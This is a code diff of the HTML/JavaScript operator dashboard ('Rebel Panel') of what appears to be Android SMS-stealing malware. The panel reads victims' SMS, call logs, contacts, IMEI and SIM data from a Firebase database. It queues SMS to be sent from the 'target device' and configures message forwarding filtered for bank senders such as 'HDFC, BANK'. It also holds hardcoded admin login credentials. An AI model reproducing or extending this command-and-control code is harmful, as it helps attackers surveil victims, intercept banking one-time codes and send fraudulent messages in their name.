-      <thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
-      <tbody id="fwTableBody"></tbody>
-    </table>
-  </div>
-</div>
+
+  <!-- MAIN AREA -->
+  <div class="main-area">
+    <!-- EMPTY STATE -->
+    <div class="empty-state" id="emptyState">
+      <div class="empty-icon">📡</div>
+      <div class="empty-txt">Select a device to view data</div>
+    </div>
+
+    <!-- DEVICE DETAIL -->
+    <div id="deviceDetail" class="hidden">
+
+      <!-- HERO -->
+      <div class="dev-hero">
+        <div class="hero-top">
+          <div>
+            <div class="hero-name" id="dName">—</div>
+            <div class="hero-brand" id="dBrand">—</div>
+            <div class="hero-id" id="dId">—</div>
+          </div>
+          <div id="dBadge" class="hero-badge offline">OFFLINE</div>
+        </div>
+        <div class="hero-metrics">
+          <div class="hm"><div class="hm-lbl">BATTERY</div><div class="hm-val" id="dBat">—</div></div>
+          <div class="hm"><div class="hm-lbl">NETWORK</div><div class="hm-val green" id="dNet">—</div></div>
+          <div class="hm"><div class="hm-lbl">ANDROID</div><div class="hm-val" id="dAndroid">—</div></div>
+          <div class="hm"><div class="hm-lbl">SMS COUNT</div><div class="hm-val orange" id="dSmsCount">—</div></div>
+          <div class="hm"><div class="hm-lbl">LAST SEEN</div><div class="hm-val" id="dLastSeen">—</div></div>
+        </div>
+      </div>
+
+      <!-- DATA TABS -->
+      <div class="data-tabs">
+        <button class="data-tab active" onclick="switchDataTab('sms',this)">💬 SMS <span class="tab-badge" id="tc-sms">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('calls',this)">📞 Calls <span class="tab-badge" id="tc-calls">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('contacts',this)">👥 Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('sim',this)">📶 SIM / IMEI</button>
+        <button class="data-tab" onclick="switchDataTab('perms',this)">🔐 Permissions</button>
+        <button class="data-tab" onclick="switchDataTab('sendsms',this)">📤 Send SMS</button>
+        <button class="data-tab" onclick="switchDataTab('forward',this)">↗️ Forwarding</button>
+      </div>
+
+      <!-- SMS -->
+      <div class="data-section active" id="tab-sms">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
+          <div class="sec-title">SMS <span>Messages</span></div>
+          <input class="dm-search" placeholder="Search messages..." oninput="filterRows('smsTbody',this.value)"/>
+        </div>
+        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
+        <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data</td></tr></tbody></table></div>
+        <div id="smsEmpty" class="tbl-empty" style="display:none">📭 No SMS data. Grant READ_SMS on device.</div>
+      </div>
+
+      <!-- CALLS -->
+      <div class="data-section" id="tab-calls">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
+          <div class="sec-title">Call <span>History</span></div>
+          <input class="dm-search" placeholder="Search calls..." oninput="filterRows('callsTbody',this.value)"/>
+        </div>
+        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Contact</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead>
+        <tbody id="callsTbody"><tr><td colspan="6" class="tbl-empty">No call data</td></tr></tbody></table></div>
+      </div>
+
+      <!-- CONTACTS -->
+      <div class="data-section" id="tab-contacts">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
+          <div class="sec-title">Contacts <span>List</span></div>
+          <input class="dm-search" placeholder="Search contacts..." oninput="filterRows('contactsTbody',this.value)"/>
+        </div>
+        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead>
+        <tbody id="contactsTbody"><tr><td colspan="3" class="tbl-empty">No contacts data</td></tr></tbody></table></div>
+      </div>
+
+      <!-- SIM -->
+      <div class="data-section" id="tab-sim">
+        <div class="sec-title" style="margin-bottom:8px">SIM <span>Information</span></div>
+        <div class="sim-grid" id="simGrid"><div style="color:var(--muted);font-family:'Space Mono',monospace;font-size:10px">Loading...</div></div>
+      </div>
+
+      <!-- PERMS -->
+      <div class="data-section" id="tab-perms">
+        <div class="sec-title" style="margin-bottom:8px">App <span>Permissions</span></div>
+        <div class="perm-grid" id="permGrid"></div>
+      </div>
+
+      <!-- SEND SMS -->
+      <div class="data-section" id="tab-sendsms">
+        <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
+        <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
+        <div class="config-card">
+          <div class="input-group">
+            <div><label>📞 To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
+            <div><label>💬 Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
+          </div>
+          <button class="btn-sm" onclick="sendSms()">📤 Send SMS to Device</button>
+          <div id="sendStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
+        </div>
+        <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
+        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead>
+        <tbody id="sentTbody"></tbody></table></div>
+      </div>
+
+      <!-- FORWARDING -->
+      <div class="data-section" id="tab-forward">
+        <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
+        <div class="config-card">
+          <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
+            <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
+            <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent)"/>
+          </div>
+          <div class="input-group">
+            <div><label>📞 Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
+            <div style="display:flex;align-items:center;gap:12px">
+              <label style="margin:0;font-size:11px;color:var(--text)">Forward All SMS</label>
+              <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwFilterDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent)"/>
+            </div>
+            <div id="fwFilterDiv" style="display:none"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
+          </div>
+          <button class="btn-sm" onclick="saveFw()">💾 Save Settings</button>
+        </div>
+        <div class="sec-title" style="margin:20px 0 10px">Forwarding <span>History</span></div>
+        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
+        <tbody id="fwTbody"></tbody></table></div>
+      </div>
+
+    </div><!-- /deviceDetail -->
+  </div><!-- /main-area -->
+</div><!-- /main-layout -->
 
 <footer>
   <div class="footer-brand"><strong>Rebel Panel</strong> — SpinPlay99 Real-Time Dashboard</div>
   <div class="footer-brand" id="footerTime"></div>
 </footer>
-</div>
+</div><!-- /wrapper -->
 
 <div class="toast-container" id="toastContainer"></div>
 
 <script>
-var DB, allDevs=[], selDev='', devFilter='all', activeListeners={};
+var DB, allDevs=[], selDev='', activeListeners={};
 
 // ═══ FIREBASE ═══
 (function(){
@@ -358,10 +403,7 @@ var DB, allDevs=[], selDev='', devFilter='all', activeListeners={};
   });
   DB = firebase.database();
   setStatus('connected','Connected');
-  document.getElementById('navTabs').classList.remove('hidden');
-  document.getElementById('devSelectorBar').classList.remove('hidden');
   startDeviceListener();
-  switchTab('devices');
 })();
 
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
@@ -370,7 +412,7 @@ function setStatus(t,m){var p=document.getElementById('statusPill');p.className=
 function startDeviceListener(){
   DB.ref('devices').on('value',function(snap){
     var raw=snap.val(); allDevs=[];
-    if(!raw){renderDevices();updateStats();renderChips();return;}
+    if(!raw){renderSidebar();updateStats();return;}
     var now=Date.now();
     Object.keys(raw).forEach(function(k){
       var d=raw[k],info=d.device_info||{},live=d.live_data||{};
@@ -383,105 +425,137 @@ function startDeviceListener(){
     allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:b.lastSeen-a.lastSeen;});
     if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
     if(selDev&&!allDevs.find(function(d){return d.id===selDev;})) selDev=allDevs.length>0?allDevs[0].id:'';
-    document.getElementById('dtCount').textContent=allDevs.length;
-    renderDevices(); updateStats(); renderChips();
-    if(selDev) loadAllData();
+    document.getElementById('mainLayout').style.display='flex';
+    renderSidebar(); updateStats();
+    if(selDev) openDevice(selDev);
   });
 }
 
-// ═══ DEVICE CHIPS ═══
-function renderChips(){
-  var c=document.getElementById('devChips');
-  if(!allDevs.length){c.innerHTML='<span style="font-family:Space Mono,monospace;font-size:9px;color:var(--muted)">No devices</span>';return;}
-  c.innerHTML=allDevs.map(function(d){
-    return '<button class="dev-chip'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
-      '<span class="dot"></span>'+esc(d.name+(d.brand?' ('+d.brand+')':''))+'</button>';
+// ═══ SIDEBAR ═══
+function renderSidebar(){
+  var el=document.getElementById('devList'), q=(document.getElementById('devSearch').value||'').toLowerCase();
+  var list=allDevs.filter(function(d){return !q||(d.name+d.id+d.brand).toLowerCase().includes(q);});
+  if(!list.length){el.innerHTML='<div class="dev-empty">📡 No devices found</div>';return;}
+  el.innerHTML=list.map(function(d){
+    var bc=d.battery>50?'bat-hi':d.battery>20?'bat-md':'bat-lo';
+    return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDevice(\''+d.id+'\')">'+
+      '<div class="dev-top"><span class="dev-name">'+esc(d.name)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
+      '<div class="dev-uid">'+esc(d.id.substring(0,20))+'...</div>'+
+      '<div class="dev-chips"><span class="dchip '+bc+'">⚡'+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
+      '<span class="dchip">'+esc(d.network)+'</span>'+
+      '<span class="dchip">'+d.smsCount+' SMS</span></div></div>';
   }).join('');
 }
 
-function selectDevice(id){
-  selDev=id; renderChips(); renderDevices(); loadAllData();
-  var dev=allDevs.find(function(d){return d.id===id;});
-  showToast('info','📱 '+(dev?dev.name:id));
+function updateStats(){
+  document.getElementById('stTotal').textContent=allDevs.length;
+  document.getElementById('stOnline').textContent=allDevs.filter(function(d){return d.status==='online';}).length;
+  document.getElementById('stOffline').textContent=allDevs.filter(function(d){return d.status==='offline';}).length;
 }
 
-// ═══ LOAD DATA FOR SELECTED DEVICE ═══
-function loadAllData(){
-  if(!selDev||!DB) return;
+// ═══ OPEN DEVICE ═══
+function openDevice(id){
+  selDev=id; renderSidebar();
+  document.getElementById('emptyState').classList.add('hidden');
+  document.getElementById('deviceDetail').classList.remove('hidden');
+  var dev=allDevs.find(function(d){return d.id===id;});
+  if(dev) updateHero(dev);
+  loadDeviceData(id);
+}
+
+function updateHero(d){
+  document.getElementById('dName').textContent=d.name+(d.brand?' ('+d.brand+')':'');
+  document.getElementById('dBrand').textContent='Android '+d.android;
+  document.getElementById('dId').textContent='ID: '+d.id;
+  var badge=document.getElementById('dBadge');
+  badge.className='hero-badge '+d.status;
+  badge.textContent=d.status==='online'?'● ONLINE':'○ OFFLINE';
+  document.getElementById('dBat').textContent=d.battery+'%'+(d.charging?' ⚡':'');
+  document.getElementById('dNet').textContent=d.network;
+  document.getElementById('dAndroid').textContent=d.android||'?';
+  document.getElementById('dSmsCount').textContent=d.smsCount;
+  var diff=Date.now()-d.lastSeen;
+  document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
+}
+
+// ═══ LOAD DEVICE DATA ═══
+function loadDeviceData(id){
   Object.keys(activeListeners).forEach(function(p){DB.ref(p).off('value',activeListeners[p]);});
   activeListeners={};
-  var ref='devices/'+selDev;
-
+  var ref='devices/'+id;
   function on(path,cb){activeListeners[path]=DB.ref(path).on('value',cb);}
 
   // SMS
   on(ref+'/all_sms',function(snap){
-    var d=snap.val(), tb=document.getElementById('smsTableBody'), em=document.getElementById('smsEmpty');
-    if(!d||!d.messages||!d.messages.length){tb.innerHTML='';em.classList.remove('hidden');document.getElementById('smsCount').textContent='0';return;}
-    em.classList.add('hidden');
-    document.getElementById('smsCount').textContent=d.total_count||d.messages.length;
+    var d=snap.val(), tb=document.getElementById('smsTbody');
+    if(!d||!d.messages||!d.messages.length){tb.innerHTML='<tr><td colspan="5" class="tbl-empty">📭 No SMS data. Grant READ_SMS on device.</td></tr>';document.getElementById('tc-sms').textContent='0';return;}
+    document.getElementById('tc-sms').textContent=d.total_count||d.messages.length;
     tb.innerHTML=d.messages.map(function(s,i){
-      return '<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px">'+(i+1)+'</td>'+
+      var type=(s.type||'').toLowerCase();
+      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
         '<td><b>'+esc(s.address||'?')+'</b></td>'+
-        '<td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(s.body||'—')+'</td>'+
-        '<td class="last-seen">'+esc(s.date_readable||'—')+'</td>'+
-        '<td><span class="status-badge '+(s.type==='INBOX'?'online':s.type==='SENT'?'warning':'offline')+'">'+esc(s.type||'?')+'</span></td></tr>';
+        '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(s.body||'—')+'</td>'+
+        '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
+        '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
     }).join('');
   });
 
   // CALLS
   on(ref+'/all_calls',function(snap){
-    var d=snap.val(), tb=document.getElementById('callsTableBody');
-    if(!d||!d.calls){tb.innerHTML='';document.getElementById('callsCount').textContent='0';return;}
-    document.getElementById('callsCount').textContent=d.total_count||d.calls.length;
+    var d=snap.val(), tb=document.getElementById('callsTbody');
+    if(!d||!d.calls){tb.innerHTML='<tr><td colspan="6" class="tbl-empty">No call data</td></tr>';document.getElementById('tc-calls').textContent='0';return;}
+    document.getElementById('tc-calls').textContent=d.total_count||d.calls.length;
     tb.innerHTML=d.calls.map(function(c,i){
-      return '<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px">'+(i+1)+'</td>'+
-        '<td><b>'+esc(c.number||'?')+'</b></td><td>'+esc(c.contact_name||'—')+'</td>'+
-        '<td class="last-seen">'+esc(c.date_readable||'—')+'</td>'+
-        '<td class="last-seen">'+esc(c.duration||'0')+'s</td>'+
-        '<td><span class="status-badge '+(c.type==='INCOMING'?'online':c.type==='OUTGOING'?'warning':'offline')+'">'+esc(c.type||'?')+'</span></td></tr>';
+      var type=(c.type||'').toLowerCase();
+      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
+        '<td><b>'+esc(c.number||'?')+'</b></td>'+
+        '<td>'+esc(c.contact_name||'—')+'</td>'+
+        '<td class="mono" style="color:var(--muted)">'+esc(c.date_readable||'—')+'</td>'+
+        '<td class="mono">'+esc(c.duration||'0')+'s</td>'+
+        '<td><span class="sbadge '+type+'">'+esc(c.type||'?')+'</span></td></tr>';
     }).join('');
   });
 
   // CONTACTS
   on(ref+'/all_contacts',function(snap){
-    var d=snap.val(), tb=document.getElementById('contactsTableBody');
-    if(!d||!d.contacts){tb.innerHTML='';document.getElementById('contactsCount').textContent='0';return;}
-    document.getElementById('contactsCount').textContent=d.total_count||d.contacts.length;
+    var d=snap.val(), tb=document.getElementById('contactsTbody');
+    if(!d||!d.contacts){tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No contacts data</td></tr>';document.getElementById('tc-contacts').textContent='0';return;}
+    document.getElementById('tc-contacts').textContent=d.total_count||d.contacts.length;
     tb.innerHTML=d.contacts.map(function(c,i){
-      return '<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px">'+(i+1)+'</td>'+
-        '<td><b>'+esc(c.name||'No Name')+'</b></td><td class="last-seen">'+esc(c.phone||'—')+'</td></tr>';
+      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
+        '<td><b>'+esc(c.name||'No Name')+'</b></td>'+
+        '<td class="mono" style="color:var(--accent2)">'+esc(c.phone||'—')+'</td></tr>';
     }).join('');
   });
 
-  // PERMISSIONS
-  on(ref+'/live_data/permissions',function(snap){
-    var p=snap.val(), tb=document.getElementById('permsTableBody'); if(!p){tb.innerHTML='';return;}
-    tb.innerHTML=Object.entries(p).map(function(e){
-      return '<tr class="device-row"><td style="font-family:Space Mono,monospace;font-size:10px">'+e[0].replace(/_/g,' ').toUpperCase()+'</td>'+
-        '<td><span class="status-badge '+(e[1]?'online':'offline')+'">'+(e[1]?'✅ GRANTED':'❌ DENIED')+'</span></td></tr>';
-    }).join('');
-  });
-
-  // SIM INFO
+  // SIM
   on(ref+'/device_info/sim_info',function(snap){
-    var s=snap.val(), c=document.getElementById('simCards');
-    if(!s){c.innerHTML='<div class="dm-empty"><span class="empty-icon">📶</span>No SIM info yet.</div>';return;}
+    var s=snap.val(), g=document.getElementById('simGrid');
+    if(!s){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No SIM info yet</div>';return;}
     var fields=[['📱 SIM Operator',s.sim_operator_name],['🏢 Network',s.network_operator_name],['🆔 IMEI',s.imei],['📋 Subscriber ID',s.subscriber_id]];
-    c.innerHTML='<div class="data-card">'+fields.map(function(f){
-      return '<div class="field-row"><span class="field-key">'+f[0]+'</span><span class="field-val">'+(f[1]?esc(f[1]):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
+    g.innerHTML='<div class="sim-card">'+fields.map(function(f){
+      return '<div class="sim-row"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?esc(f[1]):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
     }).join('')+'</div>';
   });
 
-  // SENT SMS HISTORY
+  // PERMS
+  on(ref+'/live_data/permissions',function(snap){
+    var p=snap.val(), g=document.getElementById('permGrid'); if(!p){g.innerHTML='';return;}
+    g.innerHTML=Object.entries(p).map(function(e){
+      return '<div class="perm-item"><span class="perm-name">'+e[0].replace(/_/g,' ')+'</span>'+
+        '<span class="sbadge '+(e[1]?'granted':'denied')+'">'+(e[1]?'✅ OK':'❌ Denied')+'</span></div>';
+    }).join('');
+  });
+
+  // SENT SMS
   on(ref+'/sent_sms',function(snap){
-    var tb=document.getElementById('sentTableBody'); if(!snap.exists()){tb.innerHTML='';return;}
+    var tb=document.getElementById('sentTbody'); if(!snap.exists()){tb.innerHTML='';return;}
     var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
     tb.innerHTML=l.map(function(r){
-      return '<tr class="device-row"><td><b>'+esc(r.to||'?')+'</b></td>'+
+      return '<tr><td><b>'+esc(r.to||'?')+'</b></td>'+
         '<td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.message||'—')+'</td>'+
-        '<td><span class="status-badge online">SENT</span></td>'+
-        '<td class="last-seen">'+(r.sent_at?new Date(r.sent_at).toLocaleString():'—')+'</td></tr>';
+        '<td><span class="sbadge sent">SENT</span></td>'+
+        '<td class="mono" style="color:var(--muted)">'+(r.sent_at?new Date(r.sent_at).toLocaleString():'—')+'</td></tr>';
     }).join('');
   });
 
@@ -492,61 +566,27 @@ function loadAllData(){
     document.getElementById('fwNumber').value=s.forward_to||'';
     document.getElementById('fwAll').checked=s.forward_all!==false;
     if(s.filters&&Array.isArray(s.filters)) document.getElementById('fwFilters').value=s.filters.join(', ');
-    document.getElementById('fwDiv').style.display=s.forward_all!==false?'none':'block';
+    document.getElementById('fwFilterDiv').style.display=s.forward_all!==false?'none':'block';
   });
 
-  // FORWARDING HISTORY
+  // FORWARD LOG
   on(ref+'/forwarded_sms',function(snap){
-    var tb=document.getElementById('fwTableBody'); if(!snap.exists()){tb.innerHTML='';return;}
+    var tb=document.getElementById('fwTbody'); if(!snap.exists()){tb.innerHTML='';return;}
     var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
     tb.innerHTML=l.map(function(r){
-      return '<tr class="device-row"><td><b>'+esc(r.from||'?')+'</b></td><td>'+esc(r.to||'?')+'</td>'+
+      return '<tr><td><b>'+esc(r.from||'?')+'</b></td><td>'+esc(r.to||'?')+'</td>'+
         '<td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.body||'—')+'</td>'+
-        '<td class="last-seen">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
+        '<td class="mono" style="color:var(--muted)">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
     }).join('');
   });
 }
 
-// ═══ TABS ═══
-function switchTab(tab){
-  document.querySelectorAll('.nav-tab').forEach(function(b){b.classList.remove('active');});
-  var btn=document.querySelector('[onclick*="switchTab(\''+tab+'\')"]'); if(btn) btn.classList.add('active');
-  ['devices','sms','calls','contacts','permissions','siminfo','sendsms','forwarding'].forEach(function(t){document.getElementById(t+'Section').classList.add('hidden');});
-  document.getElementById(tab+'Section').classList.remove('hidden');
-}
-
-// ═══ DEVICES TABLE ═══
-function setDevFilter(f,btn){devFilter=f;document.querySelectorAll('.filter-btn').forEach(function(b){b.classList.remove('active');});btn.classList.add('active');renderDevices();}
-function renderDevices(){
-  var tb=document.getElementById('devTableBody'), q=(document.getElementById('devSearch').value||'').toLowerCase();
-  var list=allDevs.filter(function(d){
-    if(devFilter!=='all'&&d.status!==devFilter) return false;
-    if(q&&(d.name+d.id+d.brand).toLowerCase().indexOf(q)<0) return false;
-    return true;
-  });
-  var em=document.getElementById('devEmpty');
-  if(!list.length){tb.innerHTML='';em.classList.remove('hidden');return;}
-  em.classList.add('hidden');
-  tb.innerHTML=list.map(function(d){
-    var bc=d.battery>50?'high':d.battery>20?'medium':'low';
-    var diff=Date.now()-d.lastSeen;
-    var last=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
-    return '<tr class="device-row'+(d.id===selDev?' selected-row':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
-      '<td><div class="device-name-cell"><div class="device-icon">'+(d.status==='online'?'📱':'📴')+'</div>'+
-      '<div><div class="device-name">'+esc(d.name+(d.brand?' ('+d.brand+')':''))+'</div>'+
-      '<div class="device-id">'+esc(d.id.substring(0,16))+'...</div></div></div></td>'+
-      '<td><span class="status-badge '+d.status+'">'+d.status+(d.charging?' ⚡':'')+'</span></td>'+
-      '<td><div class="battery-bar-wrap"><div class="battery-bar"><div class="battery-fill '+bc+'" style="width:'+Math.max(0,Math.min(100,d.battery))+'%"></div></div>'+
-      '<span class="last-seen">'+d.battery+'%</span></div></td>'+
-      '<td class="last-seen">'+esc(d.network)+'</td>'+
-      '<td class="last-seen">'+d.smsCount+'</td>'+
-      '<td class="last-seen">'+last+'</td></tr>';
-  }).join('');
-}
-function updateStats(){
-  document.getElementById('stTotal').textContent=allDevs.length;
-  document.getElementById('stOnline').textContent=allDevs.filter(function(d){return d.status==='online';}).length;
-  document.getElementById('stOffline').textContent=allDevs.filter(function(d){return d.status==='offline';}).length;
+// ═══ DATA TABS ═══
+function switchDataTab(name,btn){
+  document.querySelectorAll('.data-tab').forEach(function(b){b.classList.remove('active');});
+  btn.classList.add('active');
+  document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
+  document.getElementById('tab-'+name).classList.add('active');
 }
 
 // ═══ SEND SMS ═══
@@ -555,7 +595,7 @@ function sendSms(){
   var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
   if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
   DB.ref('devices/'+selDev+'/manual_commands/send_sms').push({to:n,message:m,timestamp:firebase.database.ServerValue.TIMESTAMP})
-    .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent to device!</span>';document.getElementById('sendMsg').value='';showToast('success','✅ SMS queued');})
+    .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent!</span>';document.getElementById('sendMsg').value='';showToast('success','✅ SMS queued on device');})
     .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+e.message+'</span>';});
 }
 
@@ -576,7 +616,7 @@ function saveFw(){
 // ═══ HELPERS ═══
 function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function filterRows(id,q){q=q.toLowerCase();document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});}
-function showToast(t,m){var c=document.getElementById('toastContainer'),d=document.createElement('div');d.className='toast '+t;d.innerHTML='<span>'+(t==='success'?'✅':t==='error'?'❌':'ℹ️')+'</span><span>'+m+'</span>';c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},250);},2800);}
+function showToast(t,m){var c=document.getElementById('toastContainer'),d=document.createElement('div');d.className='toast '+t;d.innerHTML='<span>'+(t==='success'?'✅':'❌')+'</span><span>'+m+'</span>';c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},250);},2800);}
 
 // ═══ LOGIN ═══
 var AU='admin',AP='rebel2024';
